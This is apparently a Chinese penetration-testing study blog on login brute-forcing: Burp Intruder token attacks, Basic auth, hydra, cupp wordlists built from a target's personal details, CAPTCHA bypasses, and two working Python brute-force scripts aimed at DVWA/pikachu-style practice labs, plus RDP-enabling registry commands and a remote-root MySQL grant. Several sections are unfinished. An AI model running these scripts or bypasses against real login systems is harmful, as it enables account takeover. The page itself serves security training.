<h5 id="mmh3安装方式"><a href="#mmh3安装方式" class="headerlink" title="mmh3安装方式"></a>mmh3安装方式</h5><p><strong>第一种</strong>（推荐）：</p>
<p>mmh3 依赖下载地址：<a target="_blank" rel="noopener" href="https://www.wheelodex.org/projects/mmh3/wheels/mmh3-3.0.0-cp39-cp39-win_amd64.whl/">https://www.wheelodex.org/projects/mmh3/wheels/mmh3-3.0.0-cp39-cp39-win_amd64.whl/</a></p>
<p>安装指定依赖包: pip install mmh3-3.0.0-cp39-cp39-win_amd64.whl </p>
<p><strong>第二种</strong>（不推荐，vs2019非常大）：</p>
<p>安装vs2019 下载组件 C++ ATL v141 </p>
<p><img src="/2023/012220963/21.PNG" alt="21"></p>
<p>然后 pip install mmh3 即可成功安装</p>
<h4 id="工具扫描全网"><a href="#工具扫描全网" class="headerlink" title="工具扫描全网"></a>工具扫描全网</h4><p>扫描全网开放特定端口的IP，然后获取他们的特定页面的HTM源代码，用这些源代码和目标网站的特定页面的HTM源代码做对比，如果匹配上来了，就很可能是目标网站的真实P，工具匹配会匹配出来很多，最后还是要人工筛选。</p>
<p><strong>zmap扫描全网</strong></p>
<h2 id="暴力破解1"><a href="#暴力破解1" class="headerlink" title="暴力破解1"></a>暴力破解1</h2><p>“暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。</p>
<p>理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。 我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。</p>
<h3 id="弱口令爆破"><a href="#弱口令爆破" class="headerlink" title="弱口令爆破"></a>弱口令爆破</h3><p>是指使用字典文件进行爆破，字典多为经验积累其中是一些常见的字符组合。</p>
<p><strong>待补充</strong></p>
<h4 id="登录认证流程"><a href="#登录认证流程" class="headerlink" title="登录认证流程"></a>登录认证流程</h4><p><strong>待补充</strong></p>
<h4 id="简单登录认证模型"><a href="#简单登录认证模型" class="headerlink" title="简单登录认证模型"></a>简单登录认证模型</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">&lt;!DOCTYPE html&gt;
&lt;html lang&#x3D;&quot;en&quot;&gt;
&lt;head&gt;
    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;
    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt;
    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;
    &lt;title&gt;Document&lt;&#x2F;title&gt;
&lt;&#x2F;head&gt;
&lt;body&gt;
    &lt;form action&#x3D;&quot;login.php&quot; method&#x3D;&quot;POST&quot;&gt;
    账号: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot;&gt;
    &lt;br&#x2F;&gt;
    密码: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;password&quot;&gt;
    &lt;br&#x2F;&gt;
    &lt;button type&#x3D;&quot;submit&quot;&gt;登陆&lt;&#x2F;button&gt;
    &lt;&#x2F;form&gt;
    
&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;
&lt;?php
$username &#x3D; $_POST[&#39;username&#39;];
$password &#x3D; $_POST[&#39;password&#39;];
echo $username.&quot;&#x2F;&quot;.$password.&quot;\r\n&quot;;
if($username &#x3D;&#x3D; &#39;admin&#39; &amp;&amp; $password &#x3D;&#x3D; &#39;123456&#39;)&#123;
    echo &quot;欢迎您登陆成功！&quot;;
&#125;else &#123;
    echo &quot;账号或密码错误！&quot;;
&#125;
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="靶场练习"><a href="#靶场练习" class="headerlink" title="靶场练习"></a>靶场练习</h3><h4 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h4><p>在线靶场 <a target="_blank" rel="noopener" href="http://vulfocus.cn/">http://vulfocus.cn/</a> 搜索启动 dvwa</p>
<p>DVWA靶场登陆账号：admin 密码：password</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">DVWA靶场已有的账号密码：
|  1 | admin  &#x2F;  123456
|  2 | gordonb &#x2F; abc123
|  3 | pablo &#x2F; letmein<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>



<h4 id="pikachu"><a href="#pikachu" class="headerlink" title="pikachu"></a>pikachu</h4><p>在线靶场 <a target="_blank" rel="noopener" href="http://vulfocus.cn/">http://vulfocus.cn/</a> 搜索启动 pikachu</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">pikachu靶场已有的账号密码：
|  1 | admin  &#x2F;  123456
|  2 | pikachu &#x2F; 000000
|  3 | test   &#x2F;  abc123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="burp抓token爆破"><a href="#burp抓token爆破" class="headerlink" title="burp抓token爆破"></a>burp抓token爆破</h3><h4 id="token是什么？"><a href="#token是什么？" class="headerlink" title="token是什么？"></a>token是什么？</h4><p> <strong>1</strong>、<strong>Token的引入</strong>：Token是在客户端频繁向服务端请求数据，服务端频繁的去数据库查询用户名和密码并进行对比，判断用户名和密码正确与否，并作出相应提示，在这样的背景下，Token便应运而生。</p>
<p> <strong>2</strong>、<strong>Token的定义</strong>：Token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个Token便将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据即可，无需再次带上用户名和密码。</p>
<p> <strong>3</strong>、<strong>使用Token的目的</strong>：Token的目的是为了减轻服务器的压力，减少频繁的查询数据库，使服务器更加健壮。</p>
<h4 id="Token认证过程"><a href="#Token认证过程" class="headerlink" title="Token认证过程"></a>Token认证过程</h4><p><strong>基于Token的身份验证的过程如下:</strong></p>
<p>1.用户通过用户名和密码发送请求。</p>
<p>2.服务器端程序验证。</p>
<p>3.服务器端程序返回一个带签名的token 给客户端。</p>
<p>4.客户端储存token,并且每次访问API都携带Token到服务器端的。</p>
<p>5.服务端验证token，校验成功则返回请求数据，校验失败则返回错误码。</p>
<p><img src="/2023/012220963/22.PNG" alt="22"></p>
<p><strong>简单示例：</strong></p>
<ol>
<li>burp抓包发送到intruder,爆破模式选择Pitchfork</li>
</ol>
<p><img src="/2023/012220963/25.PNG" alt="25"></p>
<ol start="2">
<li>payloads中第二个数据选择Recursive grep</li>
</ol>
<p><img src="/2023/012220963/26.PNG" alt="26"></p>
<ol start="3">
<li>在Resourse Pool模块下的线程要调为1，因为一个token只能一时间产生一个</li>
</ol>
<p><img src="/2023/012220963/27.PNG" alt="27"></p>
<ol start="4">
<li>Options模块的Grep-Extract模式里添加token，有的token重复刷新会界面302获取不了，记得更换新的token</li>
</ol>
<p><img src="/2023/012220963/28.PNG" alt="28"></p>
<ol start="5">
<li>回到payloads模块加一新的token</li>
</ol>
<p><img src="/2023/012220963/28.PNG" alt="28"></p>
<ol start="6">
<li>爆破，找出正确密码</li>
</ol>
<h3 id="Basic认证爆破"><a href="#Basic认证爆破" class="headerlink" title="Basic认证爆破"></a>Basic认证爆破</h3><p>basic认证（基本认证）是从http/1.0就定义的认证方式。即使是如今仍有一部分的网站会使用这种认证方式。</p>
<p><img src="/2023/012220963/23.PNG" alt="23"></p>
<h4 id="Basic认证过程"><a href="#Basic认证过程" class="headerlink" title="Basic认证过程"></a>Basic认证过程</h4><p><strong>步骤1</strong> ：当请求的资源须要BASIC认证时，服务器会随状态码401Authorization Requireed，返回带WWW-Authenticate首部字段的响应。该字段内包含认证的方式（BASIC）及 Request-URI安全域字符串（realm）安全</p>
<p><strong>步骤2</strong> ：接收到状态码401的客户端为了经过BASIC认证，须要将用户ID及密码发送给服务器。发送的字符串内容是由用户ID和密码构成，二者中间以(:)链接后，在通过Base64编码处理。服务器假设用户ID为guest，密码是guest，链接起来就会造成guest：guest这样的字符串。而后通过base64编</p>
<p>码，最后结果是 Z3VLc3Q6Z3Vlc3Q=。把这串字符串写入首部字段Authrization以后发送请求。网站当用户代理为浏览器时，用户仅输入用户ID和密码便可，以后，浏览器会自动完成到base64编码的转换工作</p>
<p><strong>步骤3</strong>： 接收到包含首部字段Authorization请求的服务器，会对认证信息的正确性进行验证。若是验证经过，则返回一条包含Request-URI的资源响应编码basic认证虽然采用了Base64编码方式，但这不是加密处理。不须要任何附加信息便可对其解码。换言之，因为明文解码后就是用户id和密码，在http等非加密通讯的路线上进行BASIC认证的工程中，若是被窃听，被盗的可能性极高。</p>
<p>地址：<a target="_blank" rel="noopener" href="http://vulfocus.io/">http://vulfocus.io/</a> 搜索关键字 tomcat-pass-getshell</p>
<p><strong>操作过程待补充</strong></p>
<h3 id="python编写爆破脚本"><a href="#python编写爆破脚本" class="headerlink" title="python编写爆破脚本"></a>python编写爆破脚本</h3><h4 id="python异常处理"><a href="#python异常处理" class="headerlink" title="python异常处理"></a>python异常处理</h4><p>参考链接：<a target="_blank" rel="noopener" href="https://www.runoob.com/python/python-exceptions.html">https://www.runoob.com/python/python-exceptions.html</a></p>
<h5 id="什么是异常？"><a href="#什么是异常？" class="headerlink" title="什么是异常？"></a>什么是异常？</h5><p>异常即是一个事件，该事件会在程序执行过程中发生，影响了程序的正常执行。一般情况下，在Python无法正常处理程序时就会发生一个异常。</p>
<p>异常是Python对象，表示一个错误。当Python脚本发生异常时我们需要捕获处理它，否则程序会终止执行。</p>
<h5 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h5><p>捕捉异常可以使用try/except语句。</p>
<p>try/except语句用来检测try语句块中的错误，从而让except语句捕获异常信息并处理。</p>
<p>如果你不想在异常发生时结束你的程序，只需在try里捕获它。</p>
<p>语法：</p>
<p>以下为简单的<em>try….except…else</em>的语法：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">try:
&lt;语句&gt;        #运行别的代码
except &lt;名字&gt;：
&lt;语句&gt;        #如果在try部份引发了&#39;name&#39;异常
except &lt;名字&gt;，&lt;数据&gt;:
&lt;语句&gt;        #如果引发了&#39;name&#39;异常，获得附加的数据
else:
&lt;语句&gt;        #如果没有异常发生<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="简单实例"><a href="#简单实例" class="headerlink" title="简单实例"></a>简单实例</h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">try:
    fh &#x3D; open(&quot;testfile&quot;, &quot;w&quot;)
    fh.write(&quot;这是一个测试文件，用于测试异常!!&quot;)
except IOError:
    print(&quot;Error: 没有找到文件或读取文件失败&quot;)
    exit(&quot;发生致命错误, 程序结束!&quot;)
else:
    print(&quot;内容写入文件成功&quot;)
    fh.close()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="mysite爆破脚本"><a href="#mysite爆破脚本" class="headerlink" title="mysite爆破脚本"></a>mysite爆破脚本</h4><p>burp.py</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">import requests
import time
import datetime
user_arr &#x3D; open(&quot;users.txt&quot;, &quot;r&quot;, encoding&#x3D;&quot;utf8&quot;).readlines()
# print(user_arr)
pwd_arr &#x3D; open(&quot;passwd.txt&quot;, &quot;r&quot;, encoding&#x3D;&quot;utf8&quot;).readlines()
# print(pwd_arr)
f &#x3D; open(&quot;success.txt&quot;, &quot;a&quot;, encoding&#x3D;&quot;utf8&quot;)
for j in user_arr:
    for i in pwd_arr:
        data &#x3D; &#123;
            &quot;username&quot;: j.strip(),
            &quot;password&quot;: i.strip(),
       &#125;
        print(&quot;尝试使用 &quot;+j.strip() + &quot; &#x2F; &quot; + i.strip() + &quot; 登陆&quot;)
        
        try:
            res &#x3D; requests.post(&quot;http:&#x2F;&#x2F;www.mysite.com&#x2F;&quot;, data&#x3D;data, 
allow_redirects&#x3D;False, timeout&#x3D;10, verify&#x3D;False)
            
        except (WindowsError) as e:
            # print(e.args)
            # print(type(e))
            print(repr(e))
            print(&quot;网络连接异常, 程序将自动退出&quot;)
            exit()
            except Exception as e:
            print(&quot;未知错误，请查看error.log&quot;)
            open(&quot;error.log&quot;, &quot;a&quot;, 
encoding&#x3D;&quot;utf8&quot;).write(str(datetime.datetime.now()) + &quot; --- &quot; + repr(e) + &quot;\n&quot;)
            exit()
            
        else:
            if(res.status_code &#x3D;&#x3D; 302):
                f.write(j.strip() + &quot;:&quot; + i)
                print(&quot;success&quot; + &quot;账号为 &quot; + j.strip() + &quot; 密码为 &quot; + i.strip())
                time.sleep(2)
                break
print(&quot;运行结束~！&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="pikachu-token验证爆破脚本"><a href="#pikachu-token验证爆破脚本" class="headerlink" title="pikachu token验证爆破脚本"></a>pikachu token验证爆破脚本</h4><p>burp_token.py</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">import requests
import time
import datetime
import re
session &#x3D; requests.Session()
user_arr &#x3D; open(&quot;users.txt&quot;, &quot;r&quot;, encoding&#x3D;&quot;utf8&quot;).readlines()
pwd_arr &#x3D; open(&quot;passwd.txt&quot;, &quot;r&quot;, encoding&#x3D;&quot;utf8&quot;).readlines()
f &#x3D; open(&quot;success.txt&quot;, &quot;a&quot;, encoding&#x3D;&quot;utf8&quot;)
for j in user_arr:
    for i in pwd_arr:
        try:
            res &#x3D; session.get(&quot;http:&#x2F;&#x2F;www.pikachu.com&#x2F;vul&#x2F;burteforce&#x2F;bf_token.php&quot;, timeout&#x3D;10, verify&#x3D;False)
        except (WindowsError) as e:
            print(repr(e))
            print(&quot;网络连接异常, 程序将自动退出&quot;)
            exit()
        except Exception as e:
            print(&quot;未知错误，请查看error.log&quot;)
            open(&quot;error.log&quot;, &quot;a&quot;, encoding&#x3D;&quot;utf8&quot;).write(str(datetime.datetime.now()) + &quot; --- &quot; + repr(e) + &quot;\n&quot;)
            exit()
        else:
            token &#x3D; re.findall(&#39;&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;token&quot; value&#x3D;&quot;(.*?)&quot;&#39;,res.text)[0]

        data &#x3D; &#123;
            &quot;username&quot;: j.strip(),
            &quot;password&quot;: i.strip(),
            &quot;token&quot;: token,
            &quot;submit&quot;: &quot;Login&quot;
      &#125;
        print(&quot;尝试使用 &quot;+j.strip() + &quot; &#x2F; &quot; + i.strip() + &quot; --- token: &quot;+ token +&quot; 登陆&quot;)
        try:
            res &#x3D; session.post(&quot;http:&#x2F;&#x2F;www.pikachu.com&#x2F;vul&#x2F;burteforce&#x2F;bf_token.php&quot;, 
data&#x3D;data,timeout&#x3D;10, verify&#x3D;False, allow_redirects&#x3D;False)
        except (WindowsError) as e:
            print(repr(e))
            print(&quot;网络连接异常, 程序将自动退出&quot;)
            exit()
        except Exception as e:
            print(&quot;未知错误，请查看error.log&quot;)
            open(&quot;error.log&quot;, &quot;a&quot;, encoding&#x3D;&quot;utf8&quot;).write(str(datetime.datetime.now()) + &quot; --- &quot; + repr(e) + &quot;\n&quot;)
            exit()
        else:
            if(&quot;username or password is not exists&quot; not in res.text):
                f.write(j.strip() + &quot;:&quot; + i)
                print(&quot;success&quot; + &quot;账号为 &quot; + j.strip() + &quot; 密码为 &quot; + i.strip())
                time.sleep(2)
                break
print(&quot;运行结束~！&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="暴力破解2"><a href="#暴力破解2" class="headerlink" title="暴力破解2"></a>暴力破解2</h2><h3 id="CS架构破解"><a href="#CS架构破解" class="headerlink" title="CS架构破解"></a>CS架构破解</h3><p>B/S架构即 Brouser/Server ，是一种浏览器和服务器架构模式；CS架构是指服务器-客户机。服务器-客户机，即Client/Server(C/S)结构。</p>
<h4 id="hydra爆破工具"><a href="#hydra爆破工具" class="headerlink" title="hydra爆破工具"></a>hydra爆破工具</h4><p>hydra 可以爆破 ftp / ssh / telnet / mysql / rdp 等各种服务。</p>
<p>常用参数</p>
<p><img src="/2023/012220963/24.PNG" alt="24"></p>
<h5 id="学习平台实操"><a href="#学习平台实操" class="headerlink" title="学习平台实操"></a>学习平台实操</h5><p>登陆vpn访问学习平台：<a target="_blank" rel="noopener" href="https://edu.work.ltsec.com/index">https://edu.work.ltsec.com/index</a> 访问暴力穷举破解进行练习</p>
<h5 id="mysql开启远程登录"><a href="#mysql开启远程登录" class="headerlink" title="mysql开启远程登录"></a>mysql开启远程登录</h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">登陆mysql
use &#96;mysql&#96;;
# 注意将密码替换掉
GRANT ALL PRIVILEGES ON *.* TO &#39;root&#39;@&#39;%&#39; IDENTIFIED BY &#39;你的密码&#39; WITH GRANT
OPTION;
FLUSH PRIVILEGES;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="windows开启rdp远程桌面服务"><a href="#windows开启rdp远程桌面服务" class="headerlink" title="windows开启rdp远程桌面服务"></a>windows开启rdp远程桌面服务</h5><pre class="line-numbers language-none"><code class="language-none">查看远程端口或者使用注册表
REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; 
&quot;Server\WinStations\RDP-Tcp &#x2F;v PortNumber
再
set &#x2F;a a&#x3D;0xd3d
当远程桌面服务被关闭时，可以用注册表命令开启
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v 
fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="超级弱口令爆破工具"><a href="#超级弱口令爆破工具" class="headerlink" title="超级弱口令爆破工具"></a>超级弱口令爆破工具</h4><p>填写目标 ip 、账户名或账号密码字典 进行爆破破解。</p>
<p><strong>操作待补充</strong></p>
<h5 id="自定义端口号"><a href="#自定义端口号" class="headerlink" title="自定义端口号"></a>自定义端口号</h5><p>点击设置可更改服务默认端口。</p>
<p><strong>操作待补充</strong></p>
<h4 id="社工字典生成"><a href="#社工字典生成" class="headerlink" title="社工字典生成"></a>社工字典生成</h4><p>当你收集到目标的具体信息后，你就可以通过工具来智能化生成关于目标的字典。当对目标进行渗透测试的时候，常见密码爆破不成功，大批量的字典耗时太长时，就需要一份结合具体目标的带社工性质的字典，可以很大提升爆破效率。</p>
<h5 id="亦思"><a href="#亦思" class="headerlink" title="亦思"></a>亦思</h5><p><strong>操作待补充</strong></p>
<h5 id="cupp"><a href="#cupp" class="headerlink" title="cupp"></a>cupp</h5><p>Cupp是一款用Python语言写成的可交互性的字典生成脚本</p>
<p>Kali 安装 Cupp: apt-get install cupp</p>
<p><strong>查看命令：****cupp</strong></p>
<p><strong>参数说明</strong></p>
<pre class="line-numbers language-none"><code class="language-none">参数名 参数含义
-v 查看cupp版本号
-h 查看参数列表
-l 从github仓库里面下载字典
-i 使用交互式的提问创建用户字典
-w 在已存在的字典上进行扩展<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>执行cupp -i生成字典</strong></p>
<p>输入被攻击目标的姓、名、外号、生日、父母的名字、外号、生日、子女的名字、外号、生日等等一系列的信息。如果你有这些信息，直接输入，如果没有直接回车进行下一步。然后是宠物、公司等名称，需要不需要加关键字当前缀后缀等等，如果不知道或者不想加，直接回车跳过最后在命令执行的目录里生成字典文件。</p>
<p>注意：输入生日信息的时候是按照日、月、年的顺序，如11021990就是1990年2月11</p>
<h3 id="验证码绕过"><a href="#验证码绕过" class="headerlink" title="验证码绕过"></a>验证码绕过</h3><p>验证码原理：客户端发起请求-&gt;服务端响应并创建一个新的SessionID同时生成随机验证码，将验证码和SessionID一并返回给客户端-&gt;客户端提交验证码连同SessionID给服务端-&gt;服务端验证验证码同时销毁当前会话，返回给客户端结果。</p>
<p>【客户端可能存在的安全问题】</p>
<p>1、有的网站验证码由本地js生成仅仅在本地用js验证。可以在本地禁用js，用burp把验证字段删除。</p>
<p>2、有的网站把验证码输出到客户端html中，送到客户端Cookie或response headers。</p>
<p>3、有些网站默认不显示验证码，而是在输入错误一定数量之后才需要验证验证码，开发人员可能在Cookie中写入一个标记loginErr，用来记录错误数量，则可以不更新Cookie中的loginErr值反复提交，验证码就不会出现。</p>
<p>【服务端可能存在的安全问题】</p>
<p>1、验证码不过期，没有及时销毁会话导致同一验证码反复可用。攻击者可以在Cookie中带固定的sessionID和固定的验证码字符串。</p>
<p>2、没有对验证码进行非空判断，导致可以直接删除验证码参数。</p>
<p>3、产生的验证码问题有限</p>
<h4 id="验证码固定"><a href="#验证码固定" class="headerlink" title="验证码固定"></a>验证码固定</h4><p>导致验证码不刷新（固定）的原因是：登录密码错误之后，session中的值没有更新，验证码不变。验证码不刷新通常有以下两种情况：无条件不刷新、有条件不刷新。</p>
<h5 id="无条件不刷新"><a href="#无条件不刷新" class="headerlink" title="无条件不刷新"></a>无条件不刷新</h5><p>无条件不刷新是指在某一时间段内，无论登录失败多少次，只要不刷新页面，就可以无限次的使用同一个验证码来对一个或多个用户帐号进行暴力猜解。换句话说，攻击者可以在同一个会话下，在获得第一个验证码后，后面不再主动触发验证码生成页面，并且一直使用第一个验证码就可循环进行后面的表单操作，从而绕过了验证码的屏障作用，对登录进行暴力猜解。</p>
<h5 id="有条件不刷新"><a href="#有条件不刷新" class="headerlink" title="有条件不刷新"></a>有条件不刷新</h5><p>有条件不刷新多见于如下情况：登录失败之后，系统会打开一个新页面或者弹出一个新的警告窗口，提示用户登录失败，点击确定后返回登录界面且验证码刷新。这种情况下，只要我们不关闭新窗口或弹窗，配合使用Burpsuite的intruder模块就可以进行暴力破解了。某系统的验证码鉴权流程：用户输入账户信息+验证码(刷新页面或手动刷新验证码会从服务器获取验证码，但该验证码缓存于session中)，服务端接收到账户信息+验证后会先校验验证码是否正确，若不正确则，返回反之与数据库做对比，符合则返回，客户端接收服务端的请求，若成功则跳转，返回根据不同的错误码提示相应信息，并重新获取服务端生成的新验证码，重新缓存。</p>
<p>【问题描述】看完流程可以很容易想到一个问题：验证码此时并不会重置，一切重置验证码的操作都在浏览器，所以在Session不失效的时效内，可以无限重用验证码，这时就可以使用BurpSuite进行暴力破解了，验证码形同虚设。</p>
<p><strong>操作待补充</strong></p>
<p>仅在客户端生成验证码</p>
<p>有的网站验证码由前端js生成仅仅在前端用js验证，这种验证码形同虚设直接使用burp抓包提交即可。</p>
<p><strong>操作待补充</strong></p>
<h4 id="验证码隐藏在源码之中"><a href="#验证码隐藏在源码之中" class="headerlink" title="验证码隐藏在源码之中"></a>验证码隐藏在源码之中</h4><p>验证这种情况很简单，我们只需要记住验证码，然后右键打开网站源代码，Ctrl+F搜索，输入刚才的验证码，如果可以成功匹配到，那恭喜你，接下来就可以写工具，提取源码中的验证码并将其放入每次请求的报文中，来进行帐号破解，使用python编写脚本即可。</p>
<h4 id="验证码隐藏在Cookie中"><a href="#验证码隐藏在Cookie中" class="headerlink" title="验证码隐藏在Cookie中"></a>验证码隐藏在Cookie中</h4><p>一般来说，我们会把验证码的值用Session存储起来，通过对比用户提交的验证码和Session中的验证码，就可以知道输入是否正确。由于Session会占用服务器资源，有的开发人员会把验证码的值加密后存储在Cookie中。</p>
<p>这种情况，我们可以在提交登录的时候抓包，然后分析一下包中的Cookie字段，看看其中有没有相匹配的验证码，或者是经过了一些简单加密后的验证码。</p>
<h4 id="验证码可穷举"><a href="#验证码可穷举" class="headerlink" title="验证码可穷举"></a>验证码可穷举</h4><p>有的验证码不是使用算法随机生成的，而是一些固定的图片，多刷新几次验证码我们可能会发现系统中的存在就那么一些验证码，这种情况这种情况下只要将验证码全部下载下来，生成一个md5库，然后将前端生成的验证码与本地文件进行对比即可。</p>
<p>思路：建立图片md5库 与 对应验证码值库后，用 resquest.Session() 建立一个可保持状态的request对象，下载验证码图片后与md5库对比得出验证码值，进行登陆爆破即可。</p>
<h2 id="暴力破解与加密"><a href="#暴力破解与加密" class="headerlink" title="暴力破解与加密"></a>暴力破解与加密</h2><h3 id="Debug代码调试"><a href="#Debug代码调试" class="headerlink" title="Debug代码调试"></a>Debug代码调试</h3><p>Debug的意义在于发现程序错误的存在以隔离、消除等方式对错误，进行定位确定错误产生的原因，提出纠正错误的解决办法，对程序错误予以改正</p>
<h4 id="vscode-debug-python"><a href="#vscode-debug-python" class="headerlink" title="vscode debug python"></a>vscode debug python</h4><h5 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h5><h6 id="1-安装插件python"><a href="#1-安装插件python" class="headerlink" title="1.安装插件python"></a>1.安装插件python</h6><p><img src="/2023/012220963/30.PNG" alt="30"></p>
<h6 id="2-配置文件"><a href="#2-配置文件" class="headerlink" title="2.配置文件"></a>2.配置文件</h6><p>vscdoe会在每个文件夹下创建一个 .vscode 的配置文件目录 ， 在其中创建 <strong>launch.json 、tasks.json</strong></p>
<p><img src="/2023/012220963/31.PNG" alt="31"></p>
<p><strong>lanuch.json</strong></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">&#123;
    &#x2F;&#x2F; 使用 IntelliSense 了解相关属性。
    &#x2F;&#x2F; 悬停以查看现有属性的描述。
    &#x2F;&#x2F; 欲了解更多信息，请访问: https:&#x2F;&#x2F;go.microsoft.com&#x2F;fwlink&#x2F;?linkid&#x3D;830387
    &quot;version&quot;: &quot;0.2.0&quot;,
    &quot;configurations&quot;: [
       &#123;
            &quot;name&quot;: &quot;Python&quot;,
            &quot;type&quot;: &quot;python&quot;,
            &quot;request&quot;: &quot;launch&quot;,
            &quot;stopOnEntry&quot;: false,
            &quot;python&quot;: &quot;D:\\python\\python\\python.exe&quot;, &#x2F;&#x2F; 替换为自己的python.exe路径
            &quot;program&quot;: &quot;$&#123;file&#125;&quot;,
            &quot;cwd&quot;: &quot;$&#123;workspaceRoot&#125;&quot;,
            &quot;env&quot;: &#123;&#125;,
            &quot;envFile&quot;: &quot;$&#123;workspaceRoot&#125;&#x2F;.env&quot;,
            &quot;redirectOutput&quot;: true,
       &#125;
   ]
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>tasks.json</strong></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">&#123;
    &quot;version&quot;: &quot;2.0.0&quot;,
    &quot;tasks&quot;: [
       &#123;
            &quot;label&quot;: &quot;python&quot;,
            &quot;type&quot;: &quot;shell&quot;,
            &quot;command&quot;: &quot;D:\\python\\python\\python.exe&quot;, &#x2F;&#x2F; 替换为自己的python.exe路径
            &quot;args&quot;: [
                &quot;$&#123;file&#125;&quot;
           ],
            &quot;group&quot;: &#123;
                &quot;kind&quot;: &quot;build&quot;,
                &quot;isDefault&quot;: true
           &#125;,
            &quot;problemMatcher&quot;: [
                &quot;$eslint-compact&quot;
           ]
       &#125;
   ]
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h6 id="修改python解释器"><a href="#修改python解释器" class="headerlink" title="修改python解释器"></a>修改python解释器</h6><p>vscode中Ctrl+shirt+p调出查询窗口，输入python:select选择python解释器</p>
<p><img src="/2023/012220963/32.PNG" alt="32"></p>
<h5 id="Debug-Start"><a href="#Debug-Start" class="headerlink" title="Debug Start"></a>Debug Start</h5><p>使用debug模式启动程序代码</p>
<p><img src="/2023/012220963/33.PNG" alt="33"></p>
<h6 id="1-下断点debug"><a href="#1-下断点debug" class="headerlink" title="1.下断点debug"></a>1.下断点debug</h6><p>在想要调试的代码处下断点，程序debug运行后会停在此行代码执行前，等待用户调试。</p>
<h6 id="2-调试选项"><a href="#2-调试选项" class="headerlink" title="2.调试选项"></a>2.调试选项</h6><p><strong>继续</strong>：继续执行程序，直到遇到下一个断点为止</p>
<p><strong>单步跳过</strong>：在普通代码行运行时，会逐行运行程序。若遇到调用自定义函数命令，且在该定义的函数里没有断点，则直接运行完该函数，不会进入该函数并逐行运行该函数内的代码</p>
<p><strong>单步调试</strong>：逐行顺序运行程序。若遇到自定义函数（def），则进入该函数，逐行运行该函数内的代码</p>
